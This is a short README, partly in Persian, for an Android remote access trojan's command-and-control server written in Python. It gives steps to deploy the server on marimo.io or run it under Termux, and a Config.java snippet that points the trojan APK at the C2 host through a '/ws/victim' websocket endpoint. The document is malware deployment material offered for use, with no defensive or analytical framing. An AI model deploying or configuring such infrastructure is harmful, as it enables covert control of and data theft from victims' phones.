# RAT C2 Server — Python

## Deploy on marimo.io

1. آپلود کن همه فایل‌ها رو
2. entry point: `server.py`
3. requirements: `requirements.txt`

## Run locally (Termux)

```bash
pkg install python -y
pip install aiohttp
python server.py
```

## APK Config

در Config.java:
```java
public static final String C2_HOST = "your-marimo-url.com";
public static final int    C2_PORT = 443;

public static String wsUrl() {
    return "wss://" + C2_HOST + "/ws/victim";
}
```
